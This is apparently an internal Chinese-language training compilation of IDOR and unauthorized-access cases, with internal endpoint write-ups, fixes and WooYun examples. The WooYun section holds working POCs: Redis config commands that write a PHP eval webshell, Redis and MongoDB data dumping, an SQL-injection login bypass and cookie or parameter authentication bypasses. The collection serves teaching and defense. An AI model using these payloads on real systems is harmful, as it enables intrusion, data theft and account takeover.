# 越权（IDOR）案例集

> 整合内部真实漏洞与业界经典案例，提供实战指导

## 一、内部真实案例

### 案例1：更新、删除入离职HC预测接口存在越权
**系统**: 某内部系统

**漏洞描述**:
Controller层检查了orgPathCode，但实际更新、删除时，却根据id进行操作，并未和orgPathCode进行关联，故存在越权。同controller下 `/predict/adjust/updateEmployeePredict`、`/predict/adjust/deleteEmployeePredict`、`/predict/adjust/updateOrgPredict`、`/predict/adjust/deleteOrgPredict` 接口存在类似越权问题。

**技术细节**:
- 漏洞类型：水平越权（IDOR）
- 入口参数：id、orgPathCode
- 攻击向量：修改请求中的 id 参数为其他用户的资源ID，绕过 orgPathCode 的前置校验

**修复方案**:
检查更新、删除操作最终依据的参数和当前用户的关系，确保 WHERE 条件同时包含资源ID和当前用户标识。

**经验总结**:
需在服务端校验资源归属，而非仅校验参数格式有效性，防止通过修改ID横向访问他人数据。

---

### 案例2：CRM系统 operateForm 接口存在多参数平行越权
**系统**: 某内部系统

**漏洞描述**:
`/rest/crm/salesCopilot/chat/user/operateForm` 接口在4个业务场景下均存在平行越权：账户诊断场景中 `account_id`、`campaign_id`、`unit_id`、`agent_id`、`role_id` 参数存在越权；风控限流查询场景中 `account_id`、`photo_id`、`creative_id`、`unit_id` 等参数存在越权；风控新客查询场景中 `corp_name` 参数存在越权；账户催审/复审场景中 `account_id`、`agent_id`、`role_id` 参数存在越权。

**技术细节**:
- 漏洞类型：水平越权（IDOR）
- 入口参数：account_id、agent_id、role_id、photo_id、creative_id、unit_id
- 攻击向量：修改 formId 对应场景下的资源ID参数，访问其他代理商数据

**修复方案**:
后端严格校验相关资源id是否属于当前登录代理商，逐一对每个业务参数进行归属校验。

**经验总结**:
批量接口同样需要逐一校验资源归属，不能只校验单个核心ID而忽略关联参数。

---

### 案例3：评论功能多个越权漏洞
**系统**: 某内部系统

**漏洞描述**:
修改页面名称、查看页面评论、添加页面评论、删除评论四个接口存在越权问题：pageId未校验当前用户权限范围；dashboardPageId未校验是否在相同的tenant中；commitId未校验是否有权限操作他人评论。

**技术细节**:
- 漏洞类型：水平越权（IDOR）
- 入口参数：pageId、dashboardPageId、commitId
- 攻击向量：修改 pageId / dashboardPageId / commitId 参数，操作他人页面内容或评论

**修复方案**:
- 检查 pageId 是否属于当前用户权限范围
- 检查 dashboardPageId 与当前用户的 tenant 关系
- 检查 commitId 与当前用户的权限关系，禁止操作他人评论

**经验总结**:
对增删改操作必须严格校验资源 ownership，查询接口也需要过滤返回结果，限制在当前用户权限范围内。

---

### 案例4：fansTop 订单评分接口存在同表越权
**系统**: 某内部系统

**漏洞描述**:
`/rest/w/fansTop/order/grade` 接口存在同表越权：传入的 ksOrderId 如果和当前用户同属一张数据库表，则可越权查看他人订单信息。同controller下多个接口（follower/info、coupon/activity、orderInfo、suggestion、account/pay/status 等）均存在类似问题。

**技术细节**:
- 漏洞类型：水平越权（IDOR）
- 入口参数：ksOrderId、photoid
- 攻击向量：枚举同分片表内的 ksOrderId，越权访问他人订单评分及支付状态

**修复方案**:
在数据库查询时，将 photoid、ksOrderId 均限制在当前用户权限范围内。

**经验总结**:
在数据库查询时，必须将用户标识作为过滤条件，而非单纯根据业务ID查询。

---

### 案例5：DMP 数据源接口未授权访问 + 越权
**系统**: 某内部系统

**漏洞描述**:
`/rest/dmp/us/**` 路径下13个接口存在未授权访问与越权双重漏洞，可在未登录情况下为任意广告主创建、修改、查看、重新计算数据源，涉及 datasource/add、datasource/update、datasource/info、crowdpack/create、recalculate 等接口。

**技术细节**:
- 漏洞类型：未授权访问 + 水平越权（IDOR）
- 入口参数：dataSourceId、dataSourceIds
- 攻击向量：未携带有效 servicetoken 直接访问接口，或修改 dataSourceId 为他人数据源ID

**修复方案**:
1. 接口禁止未授权访问，须校验 servicetoken 等用户身份标识
2. 在获取有效身份后，校验 dataSourceId 是否属于当前用户

**经验总结**:
修改/删除操作时不能仅依赖前端传入的归属参数，需从数据库中重新查询资源的真实归属者。

---

### 案例6：广告代理商共享钱包转账接口未校验账户归属
**系统**: 某内部系统

**漏洞描述**:
代理商控制台下6个财务转账接口（`/rest/dsp/agent/control-panel/finance/agent/transfer/*`）未校验当前登录人是否有权限操作某个共享钱包，也未校验 fromAccountId、toAccountId 是否归属在该钱包下。漏洞利用条件：攻击者拥有代理商账号并开通共享钱包功能。

**技术细节**:
- 漏洞类型：水平越权（IDOR）
- 入口参数：fromAccountId、toAccountId
- 攻击向量：替换转账接口中的 fromAccountId/toAccountId 为他人账户ID，实现资金越权操作

**修复方案**:
校验当前用户对共享钱包的操作权限，并验证 fromAccountId、toAccountId 均归属于该钱包。

**经验总结**:
多层级资源（如父子资源）需要级联检查权限，不能只检查直接操作的资源。

---

### 案例7：SSP 结算单合并接口越权操作
**系统**: 某内部系统

**漏洞描述**:
结算相关4个接口存在越权及并发安全问题：`/rest/ssp/settlement/invoiceUpload` 仅校验 invoiceId 未校验 settlementId、mergeId 且未加锁；`/rest/ssp/settlement/searchElectronicInvoiceList` 对 mergeId > 0 的情况可越权查看合并发票总金额；`/rest/ssp/settlement/mergeSettlement` 未对 settlementIds 鉴权且未加锁；`/rest/ssp/settlement/mergeInvoiceSubmit` 未加锁。

**技术细节**:
- 漏洞类型：水平越权（IDOR）
- 入口参数：settlementId、mergeId、settlementIds
- 攻击向量：修改 mergeId 或 settlementIds 查看或操作他人结算单

**修复方案**:
对所有结算相关参数进行归属校验，同时添加分布式锁防止并发竞态。

**经验总结**:
未授权与越权问题往往同时存在，需先检查登录态，再检查资源归属。

---

### 案例8：开放平台账户信息接口可修改他人手机号和地址
**系统**: 某内部系统

**漏洞描述**:
通过修改接口中的 uid 参数，可修改他人的手机号和收件地址。手机号用于接收应用预警/封禁通知，地址用于接收发票。SecureKVHelper 中多个方法（storeAccount、storeCompany、storeContact 等）均可能存在相同的越权问题。

**技术细节**:
- 漏洞类型：水平越权（IDOR）
- 入口参数：uid
- 攻击向量：将请求中的 uid 替换为目标用户 ID，修改他人联系信息

**修复方案**:
检查传入的 uid 是否和当前用户一致，建议在 SecureKVHelper 类的方法上使用 AOP 统一在保存信息的位置检查权限。

**经验总结**:
同一 Controller 下多个接口如存在相同的参数，需统一检查该参数的权限归属。

---

### 案例9：电商商家中心商品操作接口未校验商品归属
**系统**: 某内部系统

**漏洞描述**:
商家中心5个接口（updateProperties、setActive、setInActive、queryCommodity、auditMarkSignal）在修改、上下架、查询商品时，未校验商品是否属于当前 merchant，导致通过修改 commodityId 可越权操作他人商品。

**技术细节**:
- 漏洞类型：水平越权（IDOR）
- 入口参数：commodityId
- 攻击向量：将 commodityId 替换为其他商户的商品ID，实现越权上下架、修改

**修复方案**:
在所有商品操作前校验 commodityId 是否属于当前登录 merchant。

**经验总结**:
跨服务调用时，下游服务也需要独立校验资源权限，不能完全依赖上游传入的用户信息。

---

### 案例10：视频字幕操作接口未关联文件与用户归属
**系统**: 某内部系统

**漏洞描述**:
PhotoSubtitleController 中4个接口（getCommonFileEndpointAndToken、audioUpload、querySubtitle、postSubtitleEditResult）在对 filekey 对应视频的字幕进行增删改查时，未校验 filekey 是否属于当前用户 visitor，导致可越权修改他人视频字幕。

**技术细节**:
- 漏洞类型：水平越权（IDOR）
- 入口参数：filekey、visitor
- 攻击向量：枚举或推测他人 filekey，修改对应视频的字幕内容

**修复方案**:
将 filekey 与 visitor 关联起来，在对 filekey 对应视频的字幕进行增删改查时，校验操作权限。

**经验总结**:
财务类接口（转账、提现等）越权危害极高，文件/媒体资源类接口同样需要在服务端做严格的归属校验。

---

### 案例11：电商小黄车接口使用前端传入归属参数导致越权
**系统**: 某内部系统

**漏洞描述**:
`/rest/o/ecommerce/merchant/cart/addToCart` 和 `/rest/o/ecommerce/merchant/cart/unpin` 接口在添加商品到小黄车时，没有校验 commodityId 是否属于当前 merchant，且错误地信任了前端传入的 belongMerchant 参数，导致可将他人商品加入自己的小黄车。

**技术细节**:
- 漏洞类型：水平越权（IDOR）
- 入口参数：commodityId、belongMerchant
- 攻击向量：修改 commodityId 为他人商品ID，同时伪造 belongMerchant 参数绕过校验

**修复方案**:
根据 commodityId 到数据库查询商品所属的 merchant，与当前登录 merchant 比较，禁止信任前端传入的归属参数。

**经验总结**:
标识符可预测性低不等于安全，依赖不可猜测ID而无鉴权的设计属于安全缺陷；绝不能信任客户端传入的归属参数。

---

### 案例12：开发者平台游戏信息接口未校验 gameId 归属
**系统**: 某内部系统

**漏洞描述**:
`developer/api/game/update` 接口在更新游戏信息时，未校验 gameId 是否属于当前 userId，可越权修改其他开发者的游戏信息。同系列接口（game/info/audit、game/{gameId}、/versions、/latestVersion、/developConfig）均需考虑相同的越权风险。

**技术细节**:
- 漏洞类型：水平越权（IDOR）
- 入口参数：gameId
- 攻击向量：将 gameId 替换为他人游戏ID，越权查看、修改游戏配置及版本信息

**修复方案**:
在所有涉及 gameId 的操作前，校验该 gameId 是否归属当前 userId。

**经验总结**:
分步骤业务流程中，每个步骤都需要独立校验资源归属，不能依赖前一步骤的校验。

---

### 案例13：混剪系统越权查看私密视频
**系统**: 某内部系统

**漏洞描述**:
混剪功能分为两个接口：第一个接口提交剪辑任务（可传入任意视频ID），第二个接口查询剪辑结果（可获取视频URL）。通过组合两个接口，可越权查看他人私密视频。利用限制：任务每日上限1000个，系统每日处理上限2万条，且私密视频ID需遍历获取。

**技术细节**:
- 漏洞类型：水平越权（IDOR，跨接口利用）
- 入口参数：视频ID（跨接口传递）
- 攻击向量：在剪辑任务中传入私密视频ID，通过查询结果接口获取视频播放URL

**修复方案**:
在剪辑任务提交时校验视频ID是否属于当前用户，或在结果查询时校验视频的权限属性。

**经验总结**:
校验资源归属时需使用服务端的会话信息，不应信任客户端传入的用户ID参数；跨接口的间接越权路径也需要纳入威胁模型。

---

### 案例14：支付系统提现资格查询接口存在越权
**系统**: 某内部系统

**漏洞描述**:
`/h5/withdraw/allow_apply` 和 `/pay/seller/h5/withdraw/allow_apply_v2` 接口可越权查看他人账号是否允许提现，传入任意 submerchantid 即可查询对应商户的提现资格状态。

**技术细节**:
- 漏洞类型：水平越权（IDOR）
- 入口参数：submerchantid
- 攻击向量：枚举 submerchantid 查询他人账号提现状态，辅助进一步攻击决策

**修复方案**:
检查传入的 submerchantid 和当前用户的关联关系，禁止查看他人账号信息。

**经验总结**:
批量删除/修改接口如果允许传入ID列表，需逐个校验每个ID都归属当前用户。

---

### 案例15：商家入驻接口可越权获取他人电签平台登录态
**系统**: 某内部系统

**漏洞描述**:
`/rest/ssp/companyNewSettle/personRealName` 和 `/rest/ssp/company/renewal/companyRenewalPersonalNameUrl` 接口：联盟侧未验证传入手机号与当前用户的关联关系；电签平台仅校验手机号是否实名，未核实调用者身份；即便上上签未认证，法大大渠道可能已认证，可借返回链接携带的登录态查看他人合同。

**技术细节**:
- 漏洞类型：间接水平越权（IDOR）
- 入口参数：手机号、姓名、身份证号
- 攻击向量：传入他人手机号触发电签平台验证，获取携带登录态的跳转链接

**修复方案**:
通过短信验证码验证传入手机号与当前用户的关联，禁止传入任意手机号进行实名认证。

**经验总结**:
间接越权场景下，通过操作A影响资源B，需校验A和B之间的关联合法性。

---

### 案例16：AI批量直播平台存在垂直越权访问
**系统**: 某内部系统（女娲平台）

**漏洞描述**:
系统接入账号中台SSO校验，任意平台账号登录后均可访问接口。系统子母账号权限隔离依赖白名单，但以下接口未做白名单垂直鉴权，导致普通用户可访问母账号管理功能：`/industry/aigc/auth/account/removeSubAccount`、`/industry/aigc/batchLive/interactionLibrary/list`、`/industry/aigc/batchLive/script/list` 等8个接口。

**技术细节**:
- 漏洞类型：垂直越权
- 入口参数：visitorid
- 攻击向量：任意平台账号登录后直接调用母账号管理接口

**修复方案**:
对所有接口进行统一拦截校验，区分子母账号权限，白名单管控母账号级别接口。

**经验总结**:
更新、删除操作需确保最终 SQL 的 WHERE 条件同时包含资源ID和当前用户标识，防止越权。

---

### 案例17：子账号垂直越权使用管理员功能
**系统**: 某内部系统

**漏洞描述**:
多个接口存在垂直越权，子账号可调用管理员专属功能：`/v2/role/updateFunctionDetail` 越权加权限、`/v2/role/updateDataPermissionV2` 越权修改数据权限、`/role/resign-with-owner` 越权离职、`/role/recover` 越权复职，以及转账、账户绑定等多个敏感管理接口。

**技术细节**:
- 漏洞类型：垂直越权
- 入口参数：roleId、accountId
- 攻击向量：子账号直接调用仅限管理员的角色/权限管理接口

**修复方案**:
限制普通用户禁止调用管理员接口，在接口层统一做角色级别校验。

**经验总结**:
接口在校验了输入参数后，必须确保后续的数据库操作也使用相同的限制条件。

---

### 案例18：AuditServer 审批接口未做权限控制
**系统**: 某内部系统

**漏洞描述**:
AuditServerController 开放了 R003 权限（全员可访问），导致任意员工均可查询任意审批流、创建和开始审批流、取消审批流、审批通过或拒绝任意审批，涉及5个接口（`/api/v1/open/auditServer/query`、`createAndStartBpm`、`cancelBpmByBusinessCode`、`auditPassByBusinessCode`、`auditRejectByBusinessCode`）。

**技术细节**:
- 漏洞类型：垂直越权
- 入口参数：businessCode
- 攻击向量：普通员工直接调用审批通过/拒绝接口，操控任意审批流程

**修复方案**:
1. 垂直权限：仅限特定角色人员访问此接口
2. 水平权限：即便满足角色要求，也要检查调用者是否有权操作该审批流

**经验总结**:
垂直越权常见于 Controller 层有权限判断而 service/dao 层无同等校验的场景。

---

### 案例19：DevToolsController 后门接口存在垂直越权
**系统**: 某内部系统

**漏洞描述**:
DevToolsController 中4个后门调试接口（`/rest/web/devTools/aiPhotov/release`、`/rest/web/devTools/goodsThirdItem/updateByOrderId`、`/rest/web/devTools/goodsThirdItem/updateByItemId`、`/rest/web/devTools/aiPhoto/sendYTechMessage`）未检查调用者身份，任意登录用户均可调用。

**技术细节**:
- 漏洞类型：垂直越权
- 入口参数：orderId、itemId
- 攻击向量：任意登录用户直接调用生产后门接口触发业务操作

**修复方案**:
对后门接口做好调用者身份检查，严格限制调用权限或在生产环境移除后门接口。

**经验总结**:
权限校验应下沉到数据层，防止绕过上层校验直接操作数据。

---

### 案例20：SuperController 管理员接口泄露敏感个人信息
**系统**: 某内部系统

**漏洞描述**:
`/api/super/user/{username}` 接口位于 SuperController，推测为管理员专属接口，但实际未做权限控制，普通用户可直接调用查询他人敏感信息，包括身份证号、手机号、地址、邮箱等字段，定级高危。

**技术细节**:
- 漏洞类型：垂直越权
- 入口参数：username（路径参数）
- 攻击向量：普通用户直接访问 /api/super/user/{任意用户名} 获取完整个人信息

**修复方案**:
禁止普通用户调用此接口，添加管理员角色鉴权。

**经验总结**:
批量更新操作必须先验证所有目标资源都归属当前用户，再执行批量操作；超级管理员接口必须严格限制访问角色。

---

## 二、业界经典案例（乌云）

### 案例1：暴风某站 Redis 未授权可任意写入 WebShell
**厂商**: 暴风影音 | **类型**: Redis未授权访问 + WebShell写入

**洞察**: Redis服务未设置密码并对外暴露，通过 config set dir 和 dbfilename 命令可将 webshell 写入 Web 目录，实现完全控制。

**测试流程**:
1. 扫描发现6379端口开放
2. 尝试无密码连接 Redis
3. 确认可执行 Redis 命令
4. 通过 config set dir 设置 web 目录
5. 通过 set 写入 webshell，SAVE 持久化

**技术细节**:
Redis 未授权访问，uptime_in_days:293，通过 Redis 写文件 Getshell。

**POC示例**:
```
redis-cli -h target -p 6379
config set dir /var/www/html/
config set dbfilename shell.php
set x "\n\n<?php @eval($_POST['c']); ?>\n\n"
save
```

**绕过技巧**: 利用 Redis config 命令写任意文件，无需特殊绕过。

**修复建议**: Redis 绑定内网 IP，设置强密码（requirepass），禁止 config 命令（rename-command CONFIG）。

---

### 案例2：赣企建站系统后台登录绕过
**厂商**: 赣企建站系统 | **类型**: 未授权访问（登录绕过）

**洞察**: 建站系统后台通过 lstate 参数控制登录状态，修改该参数可绕过身份验证直接进入后台，属于典型的客户端状态信任问题。

**测试流程**:
1. 访问后台登录页面
2. 抓取登录请求包
3. 发现 lstate 等状态参数
4. 修改 lstate 值绕过验证
5. 直接访问后台功能

**技术细节**:
lstate 参数控制登录验证逻辑，通过 URL/Cookie 修改可绕过。

**POC示例**:
```
GET /admin/index.php?lstate=1 HTTP/1.1
或在Cookie中添加: lstate=1
```

**绕过技巧**: 修改 URL 参数绕过前端认证检查。

**修复建议**: 服务器端严格验证 Session，不信任客户端传递的状态参数。

---

### 案例3：中国信鸽网后台未授权访问
**厂商**: 中国信鸽网 | **类型**: 未授权访问（后台直接访问）

**洞察**: 后台管理页面仅依赖 URL 隐蔽性而非认证机制，直接访问可进入后台，"隐晦即安全"（Security through Obscurity）不是有效的安全防护。

**测试流程**:
1. 猜测 /admin/ 后台路径
2. 直接访问后台 URL
3. 确认无认证即可访问
4. 操作后台功能

**技术细节**:
后台 URL 直接可访问，无身份验证机制。

**POC示例**:
```
GET /admin/index.asp HTTP/1.1
GET /manage/index.asp HTTP/1.1
```

**绕过技巧**: 纯路径访问，无需任何绕过手段。

**修复建议**: 所有后台页面添加 Session 验证，部署 IP 白名单限制。

---

### 案例4：某服务 Redis 未授权访问泄露敏感数据
**厂商**: 某服务 | **类型**: Redis未授权访问（敏感信息泄露）

**洞察**: Redis 服务未授权访问不仅泄露大量内存数据（含 session、用户数据），若猜到 web 路径还可写 shell，危害链可持续扩大。

**测试流程**:
1. 连接 Redis 6379 端口
2. 使用 KEYS * 遍历所有键
3. GET/HGETALL 读取敏感数据
4. 若知道 web 路径则写入 shell

**技术细节**:
Redis 未授权访问，内有大量信息（session、用户数据等），如果猜对 web 路径可写 shell。

**POC示例**:
```
redis-cli -h target
KEYS *
GET session:*
HGETALL user:*
```

**绕过技巧**: 无需绕过，直接利用 Redis 默认无认证配置。

**修复建议**: Redis 绑定 127.0.0.1，防火墙限制 6379 端口，设置 requirepass。

---

### 案例5：某游戏平台 MongoDB 未授权访问泄露千万条数据
**厂商**: 某游戏平台 | **类型**: MongoDB未授权访问

**洞察**: MongoDB 默认无需认证，直接暴露在公网，攻击者可读取全部数据库，导致千万条用户数据泄露，包括 GPS 定位等高敏感信息。

**测试流程**:
1. 发现27017端口开放
2. 使用 MongoDB 客户端直接连接
3. 枚举所有数据库和集合
4. 导出用户数据

**技术细节**:
MongoDB 未授权访问，千万条用户名、GPS 定位、地理位置数据泄露。

**POC示例**:
```
mongo target:27017
show dbs
use userdb
db.users.find().limit(10)
```

**绕过技巧**: MongoDB 默认无认证，直接访问无需任何绕过。

**修复建议**: MongoDB 配置 auth=true，绑定内网地址，防火墙限制 27017 端口。

---

### 案例6：花椒直播任意用户登录（以王祖蓝为例）
**厂商**: 花椒直播 | **类型**: 未授权访问（认证绕过）

**洞察**: 直播平台身份认证存在缺陷，通过修改关键参数可登录任意用户账号，包括明星账号，服务端未校验 uid 与 token 的对应关系。

**测试流程**:
1. 正常登录自己账号抓取请求
2. 分析认证 token/uid 的生成逻辑
3. 构造目标用户的认证参数
4. 登录任意用户账号

**技术细节**:
认证逻辑缺陷，通过修改 uid 等参数可任意切换登录用户。

**POC示例**:
```
修改Cookie或POST参数中的uid为目标用户ID即可登录
```

**绕过技巧**: 服务端未校验 uid 与 token 的对应关系，直接替换参数即可绕过。

**修复建议**: 服务端验证 uid 与签名 token 的强绑定关系，token 需包含用户 ID 并做 HMAC 签名。

---

### 案例7：锐捷 RSR 路由器未授权访问及免密码登录
**厂商**: 锐捷网络RSR路由器 | **类型**: 未授权访问（网络设备默认配置）

**洞察**: 网络设备默认配置允许匿名访问，Cookie 中的 auth 参数使用 Base64 编码的空凭证（guest:），可直接登录路由器管理界面，控制整个网络设备。

**测试流程**:
1. 访问路由器 Web 管理界面
2. 尝试空密码或默认凭证
3. 确认可免密登录
4. 查看/修改路由配置

**技术细节**:
Cookie 中 currentURL/auth 参数可直接控制认证状态：auth=Z3Vlc3Q6（Base64 解码为 guest:）。

**POC示例**:
```
GET /admin/login HTTP/1.1
Cookie: currentURL=2.4; auth=Z3Vlc3Q6
```

**绕过技巧**: Base64 编码的空凭证 auth=Z3Vlc3Q6 绕过认证。

**修复建议**: 强制修改默认密码，禁用 guest 账号，升级固件。

---

### 案例8：某工控系统登录万能密码绕过
**厂商**: 工控系统 | **类型**: 未授权访问（ASP经典认证绕过）

**洞察**: ASP 系统登录验证采用 SQL 字符串拼接，在用户名和密码同时使用万能密码可绕过，属于经典 SQL 注入型登录绕过，在工控系统中危害极大。

**测试流程**:
1. 发现 ASP 登录页
2. 在用户名和密码字段同时输入 ' or '1'='1
3. 成功登录系统
4. 访问内部监控功能

**技术细节**:
Login.asp 最简单的登录绕过，用户名和密码一起注入绕过。

**POC示例**:
```
Username: ' or '1'='1
Password: ' or '1'='1
```

**绕过技巧**: 经典 SQL 注入万能密码绕过，利用 OR 条件使认证永远为真。

**修复建议**: 使用参数化查询，对登录接口做频率限制。

---

### 案例9：V5SHOP 网店系统后台 Ajax 接口认证绕过
**厂商**: V5SHOP | **类型**: 未授权访问（Ajax接口认证绕过）

**洞察**: 网店系统对 Ajax 请求的认证检查不严格，通过添加 ajax=1 参数可绕过后台认证，暴露了前后端认证逻辑不统一的问题。

**测试流程**:
1. 发现后台 Ajax 接口
2. 分析 ajax 参数对认证流程的影响
3. 构造绕过请求
4. 访问后台管理功能

**技术细节**:
V5SHOP version < 9.0，ajax 参数控制认证逻辑，可绕过后台登录。

**POC示例**:
```
GET /admin/index.php?ajax=1 HTTP/1.1
```

**绕过技巧**: Ajax 标识参数绕过认证检查，利用前后端判断逻辑不一致。

**修复建议**: 统一认证逻辑，不区分 Ajax 和普通请求的认证处理。

---

### 案例10：某互联网公司 OAuth 绑定绕过任意账号登录
**厂商**: 某互联网公司新闻客户端 | **类型**: 未授权访问（第三方OAuth绑定绕过）

**洞察**: 第三方 OAuth 登录流程中未校验 uid 与 token 的对应关系，可使用任意 uid 加自己的有效 token 登录任意用户账号，是平台级认证设计缺陷。

**测试流程**:
1. 使用第三方登录获取自己的 token
2. 修改 uid 为目标用户的 uid
3. 发送带有他人 uid 和自己 token 的登录请求
4. 成功登录目标账号

**技术细节**:
某互联网公司新闻客户端某社交平台第三方登录，uid 与 token 未做绑定验证。

**POC示例**:
```
POST /oauth/login HTTP/1.1

uid=target_user_id&token=my_own_valid_token&platform=weibo
```

**绕过技巧**: 替换 uid 参数，利用他人 uid 加自己 token，绕过仅校验 token 有效性而不校验其与 uid 绑定的逻辑。

**修复建议**: 服务端校验 OAuth 返回的 uid 与 token 的强绑定关系，从 OAuth 服务端验证 uid 而非信任客户端传递。

---

## 三、方法论总结

### 3.1 高频参数统计

| 参数名 | 出现次数 | 漏洞场景 |
|--------|----------|----------|
| id / resourceId（各类资源ID） | 12 | 通用水平越权 |
| uid / userId | 4 | 用户信息操作越权 |
| account_id / accountId | 4 | 账户/广告主越权 |
| commodityId | 3 | 商品操作越权 |
| gameId | 2 | 游戏资源越权 |
| settlementId / mergeId | 2 | 财务结算越权 |
| submerchantid | 2 | 支付商户越权 |
| filekey | 1 | 媒体资源越权 |
| token / auth / lstate | 3 | 认证绕过 |

### 3.2 攻击模式分布

| 攻击模式 | 占比 | 说明 |
|----------|------|------|
| 水平越权（IDOR） | 60% | 修改资源ID直接访问他人数据 |
| 垂直越权 | 25% | 低权限用户调用高权限接口 |
| 未授权访问 | 15% | 完全缺少认证机制 |

**水平越权的三种典型模式**：
1. **直接ID替换**：直接修改请求中的资源ID（最常见）
2. **间接越权**：通过操作A影响资源B（如商家入驻获取他人电签态）
3. **跨接口越权**：组合两个接口完成越权（如混剪接口查看私密视频）

**垂直越权的三种典型场景**：
1. **后台接口无鉴权**：DevTools、SuperController 等管理接口对外暴露
2. **角色校验缺失**：子账号可调用母账号/管理员专属接口
3. **认证逻辑绕过**：通过参数修改或协议特性绕过认证（lstate、ajax=1、OAuth uid替换）

### 3.3 关键检测信号

**代码层面（高置信度信号）**：
- Service/DAO 层缺少 `WHERE userId = currentUser` 条件
- Controller 层校验了参数格式，但未校验参数与当前用户的归属关系
- 查询时仅使用业务ID（如 commodityId、gameId）而不包含用户标识
- 使用前端传入的归属参数（如 belongMerchant）而非从数据库查询

**接口层面（需重点排查）**：
- 更新/删除接口的 WHERE 条件未绑定当前用户
- 批量操作接口未逐一校验每个ID的归属
- 多步骤业务流程中后续步骤未独立鉴权
- 跨服务调用时下游服务信任上游传入的用户信息

**认证层面（未授权访问信号）**：
- 管理/后台接口缺少角色权限注解
- OAuth 流程中服务端信任客户端传入的 uid
- Cookie/URL 参数控制认证状态（lstate、auth 等）

### 3.4 常见绕过技巧

| 绕过技巧 | 原理 | 对应案例 |
|----------|------|----------|
| 直接替换ID参数 | 服务端未校验归属 | 案例1-15（全部水平越权案例）|
| 伪造归属参数 | 信任前端传入的归属标记 | 案例11（belongMerchant）|
| 跨接口组合利用 | 单接口无漏洞但组合后产生越权 | 案例13（混剪+查询）|
| ajax参数绕过认证 | 前后端认证逻辑不一致 | 乌云案例9（V5SHOP）|
| Base64空凭证 | 设备默认空密码 | 乌云案例7（锐捷路由器）|
| OAuth uid替换 | 服务端未验证uid与token绑定 | 乌云案例10（OAuth绕过）|
| Redis写文件 | 未授权+写任意文件路径 | 乌云案例1（Redis Getshell）|
| SQL万能密码 | 登录接口SQL注入 | 乌云案例8（工控系统）|
